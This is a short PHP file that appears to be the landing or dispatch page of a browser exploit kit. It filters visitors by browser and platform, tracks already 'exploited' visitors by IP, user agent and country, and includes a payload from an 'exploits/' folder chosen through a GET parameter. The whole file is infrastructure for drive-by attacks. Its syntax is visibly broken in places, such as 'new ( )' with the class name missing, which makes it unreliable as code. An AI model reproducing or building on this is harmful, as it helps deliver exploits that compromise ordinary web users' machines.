<?php


include_once( 'config.php' );
include( 'include/browser.php' );
Browser;
$browser = new (  );
$data = $browser->identification(  );

if (( ( ( ( ( $data['browser'] != 'FIREFOX' && $data['browser'] != 'CHROME' ) && $data['browser'] != 'SAFARI' ) && $data['browser'] != 'OPERA' ) && $data['browser'] != 'MSIE' ) || $data['platform'] == 'OTHER' )) {
	exit(  );
}

include_once( 'include/sql.php' );
include_once( 'include/visitors.php' );
CSQL;
$sql = new ( $sqlSettings );
$sql->open(  );
CVisitors;
$cvisitors = new ( $sql, $sqlSettings );
$exploited = $cvisitors->checkVisitor( $_SERVER['HTTP_USER_AGENT'], $cvisitors->getIpAddr(  ), $cvisitors->getIpAddrCountry( $cvisitors->getIpAddr(  ) ) );
$sql->close(  );

if ($exploited) {
	exit(  );
}

$page = $_GET['e'];
$pos = strpos( $page, '..' );

if (( ( $page != '' && isset( $page ) ) && $pos === false )) {
	$inc = 'exploits/' . $page . '.php';

	if (file_exists( $inc )) {
		require_once( $inc );
		return 1;
	}

	require_once( 'exploits/index.php' );
	return 1;
}

require_once( 'exploits/index.php' );
?>
